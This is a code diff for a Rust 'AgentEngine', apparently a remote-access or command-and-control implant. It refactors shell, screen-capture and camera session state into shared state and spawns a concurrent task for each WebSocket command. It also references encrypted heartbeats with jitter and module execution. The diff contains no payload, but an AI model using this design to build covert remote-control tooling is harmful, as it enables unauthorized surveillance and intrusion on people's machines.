@@ -22,8 +22,17 @@ pub struct AgentEngine {
     ws: Option<WsCommunicator>,
     ws_tx: Option<WsSender>,
     agent_id: String,
-    screen_session: std::sync::Mutex<Option<tokio::sync::watch::Sender<bool>>>,
-    camera_session: std::sync::Mutex<Option<std::sync::Arc<std::sync::atomic::AtomicBool>>>,
+}
+
+/// Shared, thread-safe state that concurrent WS message handlers need.
+/// One instance lives for the whole agent run; every inbound message is
+/// dispatched as its own task against it, so a long-running task (module
+/// execution, network collection, …) never blocks the receive loop.
+pub(crate) struct EngineShared {
+    pub agent_id: String,
+    pub shell_session: tokio::sync::Mutex<Option<ShellSession>>,
+    pub screen_session: std::sync::Mutex<Option<tokio::sync::watch::Sender<bool>>>,
+    pub camera_session: std::sync::Mutex<Option<std::sync::Arc<std::sync::atomic::AtomicBool>>>,
 }
 
 impl AgentEngine {
@@ -35,8 +44,6 @@ impl AgentEngine {
             ws: None,
             ws_tx: None,
             agent_id: String::new(),
-            screen_session: std::sync::Mutex::new(None),
-            camera_session: std::sync::Mutex::new(None),
         }
     }
 
@@ -120,7 +127,6 @@ impl AgentEngine {
         let result_path = self.config.result_path.clone();
 
         let (shell_tx, mut shell_rx) = tokio::sync::mpsc::unbounded_channel::<WebSocketMessage>();
-        let mut shell_session: Option<ShellSession> = None;
         let hb_key = self.crypto.session_key();
         let hb_interval_ms = self.config.heartbeat_interval_ms;
         let hb_jitter = self.config.jitter_percent;
@@ -133,6 +139,14 @@ impl AgentEngine {
                 agent_id.clone(), hb_key,
             ),
         ));
+
+        // Shared state for concurrent handlers.
+        let shared = std::sync::Arc::new(EngineShared {
+            agent_id: agent_id.clone(),
+            shell_session: tokio::sync::Mutex::new(None),
+            screen_session: std::sync::Mutex::new(None),
+            camera_session: std::sync::Mutex::new(None),
+        });
 
         // Spawn heartbeat task using its own HTTP client, AES-GCM encrypted
         // with the session key, with per-tick jitter. Signals a re-register if
@@ -185,9 +199,19 @@ impl AgentEngine {
                                 msg.request_id.as_deref().unwrap_or("-"),
                                 msg.data.as_ref().map(|v| v.to_string()).unwrap_or_else(|| "null".into())
                             );
-                            self.handle_ws_message(
-                                msg, &tx, &shell_tx, &mut shell_session, &module_manager
-                            ).await;
+                            // Dispatch each inbound message as its own task so a
+                            // long-running handler (module execution, network
+                            // collection, …) does not block receiving or handling
+                            // further messages.
+                            let s = shared.clone();
+                            let msg_tx = tx.clone();
+                            let msg_shell_tx = shell_tx.clone();
+                            let mm = module_manager.clone();
+                            tokio::spawn(async move {
+                                crate::engine::dispatcher::dispatch(
+                                    &s, &msg_tx, &msg_shell_tx, &mm, msg,
+                                ).await;
+                            });
                         }
                         None => {
                             eprintln!("[WARN] WebSocket disconnected, reconnecting in {}ms...", reconnect_delay_ms);
